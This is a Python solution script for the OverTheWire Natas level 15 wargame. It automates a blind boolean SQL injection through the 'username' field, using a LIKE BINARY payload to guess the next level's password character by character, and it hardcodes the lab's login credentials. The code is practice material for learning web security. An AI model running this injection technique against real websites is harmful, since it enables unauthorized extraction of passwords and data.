#!/usr/bin/env python3

import string
import requests

passwd_dict = string.digits + string.ascii_letters
auth_username = 'natas15'
auth_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
exists_str = 'This user exists.'
passwd = ''

url = 'http://natas15.natas.labs.overthewire.org/index.php'
for i in range(0, 32):
    for char in passwd_dict:
        params = {
            'username': 'natas16" and password LIKE BINARY "{}{}%" -- ;'.format(passwd, char),
            'debug'   : True
        }
        r = requests.get(url, params=params, auth=(auth_username,auth_password))

        if exists_str in r.text:
            passwd += char
            print(passwd)
            break